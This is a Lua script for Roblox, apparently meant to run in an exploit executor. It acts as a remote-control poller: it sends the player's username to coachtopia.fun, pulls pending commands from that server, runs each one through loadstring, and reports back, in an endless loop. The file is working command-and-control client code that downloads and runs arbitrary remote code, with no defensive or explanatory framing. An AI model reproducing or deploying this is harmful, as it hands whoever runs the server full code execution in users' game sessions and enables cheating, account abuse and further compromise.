

local SERVER_URL = "https://coachtopia.fun"
local POLL_INTERVAL = 3 

local function httpGet(url)
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        return result
    else
        warn("[HTTP] GET failed:", result)
        return nil
    end
end

local function httpPost(url, data)
    local success, result = pcall(function()
        
        if syn and syn.request then
            syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data or ""
            })
        elseif http and http.request then
            http.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data or ""
            })
        else

            return "ok"
        end
    end)
    if success then
        return result
    else
        warn("[HTTP] POST failed (non-critical):", result)
        return nil
    end
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ROBLOX_USERNAME = LocalPlayer and LocalPlayer.Name or "unknown"
local HttpService = game:GetService("HttpService")

local function sendHeartbeat()
    local heartbeatData = HttpService:JSONEncode({
        robloxUsername = ROBLOX_USERNAME
    })
    httpPost(SERVER_URL .. "/api/poller/heartbeat", heartbeatData)
end

print("[POLLER] Starting Roblox poller...")
print("[POLLER] Server URL:", SERVER_URL)
print("[POLLER] Roblox username:", ROBLOX_USERNAME)

while true do
    local success, err = pcall(function()
        -- Send heartbeat to show we're alive
        sendHeartbeat()

        local response = httpGet(SERVER_URL .. "/api/commands/pending")
        
        if response then
            local decodeSuccess, data = pcall(function()
                return game:GetService("HttpService"):JSONDecode(response)
            end)
            
            if decodeSuccess and data.success and data.commands and #data.commands > 0 then
                for i, cmd in ipairs(data.commands) do
                    print("[EXECUTE] Received command:", cmd.name, "(order:", i, ")")
                    
                    if cmd.code then
                        print("[EXECUTE] Executing script...")
                        local execSuccess, execErr = pcall(function()
                            loadstring(cmd.code)()
                        end)
                        
                        if execSuccess then
                            print("[EXECUTE] Script executed successfully")
                        else
                            warn("[EXECUTE] Script failed:", execErr)
                        end

                        local execData = game:GetService("HttpService"):JSONEncode({
                            robloxUsername = ROBLOX_USERNAME
                        })
                        httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", execData)

                        if i < #data.commands then
                            print("[EXECUTE] Waiting before next command...")
                            wait(0.5)
                        end
                    end
                end
            end
        end
    end)
    
    if not success then
        warn("[POLLER] Error in poll loop:", err)
    end
    
    wait(POLL_INTERVAL)
end
